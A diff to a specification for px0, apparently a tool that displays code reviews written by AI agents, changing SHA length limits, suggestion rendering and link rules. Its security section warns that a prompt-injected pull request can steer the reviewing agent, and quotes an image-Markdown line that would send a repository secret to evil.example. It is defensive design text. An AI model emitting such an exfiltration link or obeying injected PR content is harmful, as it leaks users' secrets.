@@ -16,7 +16,7 @@ The words MUST, SHOULD and MAY are used as in RFC 2119. The file is written by t
 | `title` | string ≤ 200 | MAY | Plain text. |
 | `summary` | string ≤ 32 KiB | MAY | Markdown, rendered with the restrictions in §7. |
 | `base`, `head` | string | SHOULD | Any rev git resolves. `head` defaults to `HEAD`. The `-base` / `-head` flags override the file. |
-| `baseSHA`, `headSHA` | hex string, 7–64 chars | SHOULD | The revisions the agent actually reviewed. Used for staleness (§6). |
+| `baseSHA`, `headSHA` | hex string, 7–40 chars | SHOULD | The revisions the agent actually reviewed. Used for staleness (§6). |
 | `verdict` | `approve` \| `request_changes` \| `comment` | MAY | Advisory label. px0 never submits anything automatically. |
 | `generatedBy` | `{ agent, model?, sessionId? }` | MAY | `sessionId` enables the optional session handoff ([§9](#9-in-chat-discussion)). |
 | `createdAt` | RFC 3339 string | MAY | |
@@ -43,7 +43,7 @@ Unknown fields MUST be ignored, so later versions can add fields. The whole file
 
 ### Suggestions
 
-A suggested replacement uses GitHub's convention inside `body`: a fenced block whose info string is `suggestion`. It replaces lines `line..endLine`. px0 renders it as a before/after preview and **never applies it**. "Apply" dispatches an anchored instruction to the user's coding harness, which makes the edit (px0's "edits go through a harness" rule).
+A suggested replacement uses GitHub's convention inside `body`: a fenced block whose info string is `suggestion`. It replaces lines `line..endLine`. px0 shows it as a code block labelled `suggestion` and **never applies it**. "Apply" dispatches an anchored instruction to the user's coding harness, which makes the edit (px0's "edits go through a harness" rule).
 
 ## 3. Reference object (`refs[]`)
 
@@ -95,9 +95,9 @@ Models are often off by a few lines when counting, so agents SHOULD always send 
 
 `title`, `summary` and `body` are **untrusted**. A prompt-injected PR can steer the agent into writing anything, so px0 MUST:
 
-- Render Markdown only through the existing escape-first / allowlist sanitizer (`web/src/markdown.js`). Raw HTML is never inserted.
+- Render Markdown only through the thread pane's escape-first renderer (`thrMd` in [`web/src/thread.js`](../../web/src/thread.js)), in its no-images mode. Raw HTML is never inserted.
 - **Never load images.** px0's CSP allows `img-src https: http:` (see [architecture §5](architecture.md)), so an injected `![](https://evil.example/?d=<secret from the repo>)` would send data out the moment the comment rendered. An image is shown as a plain link.
-- Make only `http(s)` links, never `javascript:` or `data:`; open them with `rel="noopener noreferrer"`. A relative link is shown as plain text.
+- Links are `http(s)` or `mailto:`, or a relative `path` or `path:line` that opens that file in px0. `javascript:` and `data:` never become links. External links open with `rel="noopener noreferrer"`.
 - Treat the review as a claim to check, not a fact, when passing it to a harness (§9).
 
 ## 8. Lifecycle and transport
@@ -206,8 +206,8 @@ Draft 2020-12. The cross-field rules in §4 (`endLine ≥ line`, duplicate ids, 
     "summary": { "type": "string", "maxLength": 32768 },
     "base": { "type": "string" },
     "head": { "type": "string" },
-    "baseSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,64}$" },
-    "headSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,64}$" },
+    "baseSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,40}$" },
+    "headSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,40}$" },
     "verdict": { "enum": ["approve", "request_changes", "comment"] },
     "generatedBy": {
       "type": "object",
